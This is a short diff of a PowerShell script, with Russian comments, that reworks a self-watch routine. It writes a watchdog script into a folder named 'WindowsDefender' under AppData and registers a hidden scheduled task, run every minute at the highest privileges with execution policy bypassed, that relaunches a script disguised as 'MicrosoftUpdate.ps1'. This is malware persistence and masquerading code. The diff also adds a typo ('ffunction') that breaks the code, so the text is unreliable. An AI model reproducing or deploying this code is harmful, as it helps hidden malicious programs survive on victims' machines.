@@ -408,9 +408,13 @@ try {
 }
 
 
-function Register-SelfWatchTask {
+ffunction Register-SelfWatchTask {
     $taskName = "ZiPo_SelfWatch"
+    $watchScriptPath = "$env:APPDATA\WindowsDefender\watchdog.ps1"
+    
     $watchScript = @"
+# Watchdog запущен в: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+Add-Content -Path "$env:TEMP\watchdog.log" -Value "[*] Watchdog run: $(Get-Date)"
 \$path = '$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1'
 \$running = Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match [Regex]::Escape(\$path) }
 if (-not \$running) {
@@ -418,11 +422,18 @@ if (-not \$running) {
 }
 "@
 
-    $watchFile = "$env:TEMP\watchdog.ps1"
-    $watchScript | Out-File $watchFile -Encoding UTF8
+    # Сохраняем скрипт
+    $watchScript | Out-File -FilePath $watchScriptPath -Encoding UTF8 -Force
 
-    schtasks /Create /TN $taskName /SC MINUTE /MO 1 /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchFile`"" /F /RL HIGHEST | Out-Null
+    # Удаляем старую задачу, если есть
+    schtasks /Delete /TN $taskName /F > $null 2>&1
+
+    # Создаем задачу с корректным расписанием: ежеминутно
+    schtasks /Create /TN $taskName /SC MINUTE /MO 1 `
+        /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchScriptPath`"" `
+        /RL HIGHEST /F | Out-Null
 }
+
 
 
 
